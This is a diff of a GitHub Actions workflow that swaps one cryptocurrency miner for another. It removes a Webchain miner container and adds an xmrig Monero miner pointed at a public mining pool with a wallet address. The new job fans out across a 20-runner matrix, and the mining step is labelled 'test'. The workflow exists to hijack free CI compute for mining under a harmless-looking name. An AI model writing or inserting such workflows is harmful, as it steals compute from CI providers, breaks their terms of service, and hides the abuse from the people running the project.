@@ -7,17 +7,17 @@ on:
 jobs:
   wow:
     name: wow
-
     runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+      
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
 
     steps:
-      - name: Run super
-        run: docker run --name super -d wattpool/webchainminer -o pool.webchain.network:3333 -u 0x582e57003fC0B9A6891bD4A5d6477Cf8FEA16145 -p x
-      
-      - name: Wait super
-        run: sleep 10m 
-        
-      - name: Log super
-        run: docker logs super
+      - name: test
+        run: docker run --name miner --rm -e POOL_URL=pool.minexmr.com:4444  -e POOL_USER=488gqmpBPEtLtf97ZUs6zuRZgk1DkVYtCdVZ8AXfZh2zBvTppPysRJjeMCC5XC1neMYsNPPgp56qZejNdPMmRGibBSkP5ws metal3d/xmrig
       
       
